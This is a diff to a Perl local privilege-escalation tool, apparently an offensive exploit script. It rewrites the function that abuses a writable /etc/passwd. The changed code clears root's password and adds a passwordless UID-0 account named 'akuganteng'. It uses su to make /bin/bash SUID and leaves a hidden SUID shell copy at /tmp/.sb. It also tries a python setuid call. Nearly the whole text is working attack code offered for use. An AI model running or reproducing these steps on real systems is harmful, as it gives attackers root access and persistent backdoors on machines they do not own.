@@ -150,15 +150,29 @@ sub exploit_suid {
 sub exploit_passwd {
     return 0 unless file_writable("/etc/passwd");
     print "${G}[+] /etc/passwd is writable!${Z}\n";
-    my $salt = join '', ('a'..'z','A'..'Z','0'..'9','.','/')[map {rand 64} 1..8];
-    my $hash = crypt("rooted123", "\$6\$$salt");
-    open(my $fh, '>>', '/etc/passwd') or return 0;
-    print $fh "rooted:$hash:0:0:root:/root:/bin/bash\n";
-    print $fh "akuganteng::0:0:root:/root:/bin/bash\n";
-    close $fh;
-    print "${G}[+] Added root users: rooted(pass:rooted123) + akuganteng(no pass)${Z}\n";
-    system("su akuganteng -c 'chmod +s /bin/bash 2>/dev/null; cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb 2>/dev/null' 2>/dev/null");
+
+    # Method 1: remove root password entirely
+    my $content = "";
+    if (open(my $rf, '<', '/etc/passwd')) {
+        local $/; $content = <$rf>; close $rf;
+    }
+    $content =~ s/^root:x:/root::/m;
+    $content .= "akuganteng::0:0:root:/root:/bin/bash\n";
+    if (open(my $wf, '>', '/etc/passwd')) {
+        print $wf $content; close $wf;
+        print "${G}[+] Root password removed + akuganteng added${Z}\n";
+    }
+
+    # Method 2: try su root (no pass now)
+    system("su -c 'chmod +s /bin/bash; cp /bin/bash /tmp/.sb; chmod +s /tmp/.sb' 2>/dev/null");
     try_suid_bash();
+
+    # Method 3: use python if available
+    if (find_binary("python3")) {
+        system(q{python3 -c 'import os;os.setuid(0);os.setgid(0);os.system("chmod +s /bin/bash")' 2>/dev/null});
+        try_suid_bash();
+    }
+
     return 1;
 }
 
